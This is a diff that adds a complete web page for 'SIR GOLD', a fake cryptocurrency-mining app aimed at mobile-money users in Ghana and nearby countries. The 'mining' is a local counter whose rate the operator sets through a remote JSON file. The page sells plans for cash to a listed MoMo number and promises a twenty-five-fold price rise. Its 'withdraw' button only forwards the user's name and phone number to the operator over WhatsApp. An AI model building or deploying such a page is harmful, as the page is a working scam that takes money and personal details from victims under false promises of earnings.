@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>SIR GOLD - 24 HOURS MINING</title>
+<style>
+body{background:#000;color:#fff;font-family:Arial;text-align:center;padding:10px;margin:0}
+.box{border:1px solid gold;border-radius:15px;padding:13px;margin:10px 0;background:#111}
+.gold{color:gold}
+.btn{background:gold;color:#000;padding:14px;border:none;border-radius:12px;width:100%;font-weight:bold;font-size:16px}
+.btn2{background:#222;color:#fff;padding:10px;border:1px solid #444;border-radius:10px;width:100%;margin-top:5px}
+.btnGreen{background:#00aa00;color:#fff;padding:14px;border:none;border-radius:12px;width:100%;font-weight:bold;font-size:16px}
+.plan{border:1px solid #333;padding:11px;margin:6px 0;border-radius:10px;text-align:left}
+.plan.active{border-color:gold;background:#222}
+.hidden{display:none}
+.locked{opacity:0.3;pointer-events:none}
+select,input{background:#111;color:#fff;border:1px solid gold;padding:12px;border-radius:8px;width:100%;margin:5px 0;font-size:16px;box-sizing:border-box}
+.nav{display:flex;justify-content:space-between;background:#111;padding:12px 5px;border-radius:12px;font-size:13px}
+</style>
+</head>
+<body>
+<h1 onclick="tapTitle()">👑 <span class="gold">SIR GOLD</span></h1>
+<p style="font-size:11px;color:#aaa">  - 24 HOURS MINING - 5x for.    </p>
+<div class="box"><p>YOUR BALANCE</p><h1 class="gold" id="bal">1.97</h1><p id="bal2">GH₵ 0.39</p><p id="targetText">TARGET: 50 SIR</p><div style="background:#222;height:14px;border-radius:7px"><div id="bar" style="background:gold;height:14px;width:3%;border-radius:7px"></div></div><p id="need">Need 48.03 SIR</p><p id="globalMsg" style="font-size:11px;color:gold">🌍 GLOBAL: Loading...</p><p id="speedText" style="font-size:11px;color:#0f0">🐢 0.001/sec</p><p id="timeLeft" style="font-size:13px;color:gold">⏳ 24:00:00 left</p><p style="font-size:11px;color:#0f0">✅ Mines even if you close - Stops after 24h</p><button class="btn2" onclick="resetBal()">🔄 RESET TO 1.97</button></div>
+<div class="box" style="background:#003300"><p>💰 PRICE IN 2 YEARS</p><p>Now: GH₵ 0.20 • 2 Years: GH₵ 5.00</p></div>
+<div class="box"><p>🌍 Currency</p><select><option selected>🇬🇭 Ghana - GH₵ • MTN MoMo</option><option>🇳🇬 Nigeria - ₦</option><option>🇰🇪 Kenya - KSh</option></select><p>MTN MoMo: 0539425180</p></div>
+<button class="btn" onclick="showPlans()">👑 TAP GOLD TO CHOOSE 👑</button>
+<div id="plans" class="hidden"><div class="box"><p>👑 CHOOSE</p><button class="btn2" onclick="hidePlans()">⬅️ BACK</button><br><br>
+<div class="plan" onclick="choosePlan(50,10,30,this)">1 MONTH - 50 SIR - GH₵ 10</div>
+<div class="plan" onclick="choosePlan(150,30,60,this)">2 MONTHS - 150 SIR - GH₵ 30</div>
+<div class="plan" onclick="choosePlan(300,60,90,this)">3 MONTHS - 300 SIR - GH₵ 60</div>
+<div class="plan" onclick="choosePlan(800,160,180,this)">6 MONTHS - 800 SIR - GH₵ 160</div>
+<div class="plan" onclick="choosePlan(3000,600,365,this)">12 MONTHS - 3000 SIR - GH₵ 600</div>
+<div class="plan" onclick="choosePlan(12000,2400,730,this)">👑 24 MONTHS KING - 12000 SIR - GH₵ 2400</div>
+<br><button class="btn2" onclick="hidePlans()">⬅️ BACK</button></div></div>
+
+<div class="box" id="mineBox">
+<p>⛏️ MINING - 24 HOURS CYCLE</p>
+<button class="btn" id="startBtn" onclick="startMine()">START MINING - 24H</button>
+<button class="btnGreen hidden" id="continueBtn" onclick="continueMine()">⛏️ CONTINUE - I WANT MORE COINS SIR</button>
+<button class="btnGreen hidden" id="moreBtn" onclick="mineMore()">⛏️ MINE MORE - CONTINUE</button>
+<button class="btn2" onclick="stopMine()">STOP</button>
+<p id="status">Tap START - It will mine 24 hours</p><p id="daysLeft" style="font-size:12px;color:gold"></p>
+</div>
+
+<div id="admin" class="hidden"><div class="box" style="border-color:red;background:#220000"><p>🔐 ADMIN - ONLY SIR</p><button class="btn" onclick="window.open('https://github.com/papacentral23-spec/SIR-GOLD-MINE-/edit/main/control.json','_blank')">🌍 OPEN GLOBAL CONTROL</button><br><br><p id="adminSpeed"></p><button class="btn" onclick="checkGlobal()">🔄 CHECK GLOBAL</button><p id="adminMsg"></p><button class="btn2" onclick="document.getElementById('admin').classList.add('hidden')">⬅️ BACK</button></div></div>
+<div id="lockedMsg" class="box"><p>🔒 SYSTEM LOCKED</p><p>Wallet locked until target</p></div>
+<div id="unlockedBox" class="hidden">
+<div class="box" style="border-color:#0f0;background:#002200"><p>👑 IT TURNED TO GOLD! ✅</p><p id="proveText"></p><button class="btnGreen" onclick="mineMore()">⛏️ MINE MORE - I WANT MORE</button></div>
+<div class="box"><p>💰 WALLET OPEN</p><p id="walletBal"></p><p style="color:gold">💰 WITHDRAW</p><input type="tel" id="momoInput" placeholder="Your MoMo Number - 0551234567"><input type="text" id="nameInput" placeholder="Your Name"><button class="btn" onclick="withdraw()">💰 WITHDRAW NOW</button><p id="withdrawMsg"></p><button class="btn2" onclick="goBackHome()">⬅️ BACK</button></div></div>
+<div class="nav"><span>🏠 HOME</span><span id="navW" class="locked">💰 WALLET 🔒</span><span id="navS" class="locked">🛒 SHOP 🔒</span><span id="navI" class="locked">👥 INVITE 🔒</span></div>
+<script>
+let taps=0;let bal=parseFloat(localStorage.getItem('sir_bal')||1.97);let target=parseInt(localStorage.getItem('sir_target')||50);let days=parseInt(localStorage.getItem('sir_days')||30);let speed=0.001;let miningEnabled=true;let globalMsg="SLOWEST MODE";let timer=null;
+let startTime=parseInt(localStorage.getItem('sir_start')||0);
+let mining=localStorage.getItem('sir_mining')=='1';
+let lastTime=parseInt(localStorage.getItem('sir_time')||Date.now());
+async function loadGlobal(){try{let r=await fetch('https://papacentral23-spec.github.io/SIR-GOLD-MINE-/control.json?t='+Date.now());let d=await r.json();speed=parseFloat(d.speed);miningEnabled=d.miningEnabled!==false;globalMsg=d.message||globalMsg;if(d.target)target=parseInt(d.target);document.getElementById('globalMsg').innerText='🌍 GLOBAL: '+globalMsg+' ✅';document.getElementById('speedText').innerText='🐢 GLOBAL: '+speed+'/sec ✅';document.getElementById('adminSpeed').innerText='Speed: '+speed+' Target: '+target;updateUI()}catch(e){document.getElementById('globalMsg').innerText='🌍 GLOBAL: Local ✅'}}
+setInterval(loadGlobal,10000);loadGlobal();
+function save(){localStorage.setItem('sir_bal',bal);localStorage.setItem('sir_target',target);localStorage.setItem('sir_days',days);localStorage.setItem('sir_time',Date.now());localStorage.setItem('sir_start',startTime);localStorage.setItem('sir_mining',mining?'1':'0')}
+function getRemaining(){if(!startTime)return 0;let end=startTime+24*60*60*1000;let rem=end-Date.now();return rem>0?rem:0}
+function formatTime(ms){let s=Math.floor(ms/1000);let h=Math.floor(s/3600);let m=Math.floor((s%3600)/60);let sec=s%60;return h+':'+String(m).padStart(2,'0')+':'+String(sec).padStart(2,'0')}
+function resetBal(){bal=1.97;mining=false;startTime=0;clearInterval(timer);save();updateUI();document.getElementById('lockedMsg').classList.remove('hidden');document.getElementById('unlockedBox').classList.add('hidden');document.getElementById('moreBtn').classList.add('hidden');document.getElementById('continueBtn').classList.add('hidden');document.getElementById('startBtn').classList.remove('hidden');alert('Reset 1.97 - Tap START again')}
+function updateUI(){document.getElementById('bal').innerText=bal.toFixed(3);document.getElementById('bal2').innerText='GH₵ '+(bal*0.2).toFixed(2)+' • '+bal.toFixed(3)+' SIR';document.getElementById('targetText').innerText='TARGET: '+target+' SIR - '+days+' Days';let pct=bal/target*100;if(pct>100)pct=100;document.getElementById('bar').style.width=pct+'%';if(bal>=target){document.getElementById('need').innerText='✅ FULL! '+target+' - MINE MORE';document.getElementById('moreBtn').classList.remove('hidden')}else{document.getElementById('need').innerText='Need '+(target-bal).toFixed(3)+' SIR'}let rem=getRemaining();if(rem>0){document.getElementById('timeLeft').innerText='⏳ TIME LEFT: '+formatTime(rem)+' - Mining continues'}else{if(mining&&startTime){mining=false;save();document.getElementById('timeLeft').innerText='⏰ 24 HOURS FINISHED - Tap CONTINUE';document.getElementById('status').innerText='⏰ 24 Hours finished! Tap CONTINUE if you want more coins';document.getElementById('continueBtn').classList.remove('hidden');document.getElementById('startBtn').classList.add('hidden');clearInterval(timer)}else if(startTime){document.getElementById('timeLeft').innerText='⏰ 24 HOURS FINISHED - Tap CONTINUE'}else{document.getElementById('timeLeft').innerText='⏳ 24:00:00 - Tap START'}}let left=Math.ceil((target-bal)/speed/86400);document.getElementById('daysLeft').innerText=bal>=target?'👑 FULL - Mine more!':'⏳ '+left+' days left';if(bal>=target)unlock()}
+function tapTitle(){taps++;if(taps>=5){taps=0;document.getElementById('admin').classList.remove('hidden');alert('ADMIN - Only Sir')}}
+function checkGlobal(){loadGlobal();document.getElementById('adminMsg').innerText='✅ Checked - Speed '+speed}
+function showPlans(){document.getElementById('plans').classList.remove('hidden')}function hidePlans(){document.getElementById('plans').classList.add('hidden')}function goBackHome(){hidePlans();document.getElementById('unlockedBox').classList.add('hidden');if(bal<target)document.getElementById('lockedMsg').classList.remove('hidden')}
+function choosePlan(s,p,d,el){target=s;days=d;document.querySelectorAll('.plan').forEach(x=>x.classList.remove('active'));el.classList.add('active');updateUI();save();hidePlans()}
+function startMine(){if(!miningEnabled){alert('SIR STOPPED');return}startTime=Date.now();mining=true;save();document.getElementById('status').innerText='⛏️ Mining... 24 hours started! Will continue even if close';document.getElementById('startBtn').classList.add('hidden');document.getElementById('continueBtn').classList.add('hidden');clearInterval(timer);timer=setInterval(()=>{let rem=getRemaining();if(rem<=0){updateUI();return}bal+=speed;updateUI();save()},1000)}
+function continueMine(){startTime=Date.now();mining=true;save();document.getElementById('status').innerText='⛏️ CONTINUED! Another 24 hours started!';document.getElementById('continueBtn').classList.add('hidden');document.getElementById('startBtn').classList.add('hidden');clearInterval(timer);timer=setInterval(()=>{let rem=getRemaining();if(rem<=0){updateUI();return}bal+=speed;updateUI();save()},1000);alert('YES SIR! Continue mining! Another 24 hours!')}
+function mineMore(){continueMine()}
+function stopMine(){mining=false;clearInterval(timer);save();document.getElementById('status').innerText='Stopped - Saved: '+bal.toFixed(3)+' - Tap CONTINUE to resume';document.getElementById('continueBtn').classList.remove('hidden')}
+function unlock(){if(bal>=target){document.getElementById('lockedMsg').classList.add('hidden');document.getElementById('unlockedBox').classList.remove('hidden');document.getElementById('proveText').innerText='You reached: '+target+' SIR • GH₵ '+(target*0.2).toFixed(2);document.getElementById('walletBal').innerText=bal.toFixed(3)+' SIR • GH₵ '+(bal*0.2).toFixed(2);document.getElementById('navW').classList.remove('locked');document.getElementById('navW').innerText='💰 WALLET ✅';document.getElementById('navS').classList.remove('locked');document.getElementById('navS').innerText='🛒 SHOP ✅';document.getElementById('navI').classList.remove('locked');document.getElementById('navI').innerText='👥 INVITE ✅'}}
+function withdraw(){let m=document.getElementById('momoInput').value.trim();let n=document.getElementById('nameInput').value.trim();if(!m||m.length<10){alert('TYPE MOMO NUMBER FIRST!');return}if(!n)n='SIR USER';let amt=(bal*0.2).toFixed(2);let msg='✅ REQUEST SENT TO SIR!\nName: '+n+'\nMoMo: '+m+'\nAmount: GH₵ '+amt+'\nBalance: '+bal.toFixed(3)+' SIR';document.getElementById('withdrawMsg').innerText=msg;alert(msg);window.open('https://wa.me/233539425180?text='+encodeURIComponent('SIR GOLD WITHDRAW\nName: '+n+'\nMoMo: '+m+'\nAmount: GH₵ '+amt+'\nBalance: '+bal.toFixed(3)),'_blank')}
+if(mining&&startTime){let rem=getRemaining();if(rem>0){let gone=Math.floor((Date.now()-lastTime)/1000);let maxEarn=Math.floor(rem/1000);if(gone>maxEarn)gone=maxEarn;if(gone>0){let earned=gone*speed;bal+=earned;if(earned>0.01)alert('👑 WELCOME BACK! You mined '+earned.toFixed(3)+' SIR while app closed! Time left: '+formatTime(rem))}document.getElementById('status').innerText='⛏️ Mining... AUTO RESUMED - '+formatTime(rem)+' left';document.getElementById('startBtn').classList.add('hidden');clearInterval(timer);timer=setInterval(()=>{let r=getRemaining();if(r<=0){updateUI();return}bal+=speed;updateUI();save()},1000)}else{mining=false;save();document.getElementById('continueBtn').classList.remove('hidden');document.getElementById('startBtn').classList.add('hidden');document.getElementById('status').innerText='⏰ 24 Hours finished! Tap CONTINUE for more coins'}}
+updateUI();
+</script>
+</body>
+</html>
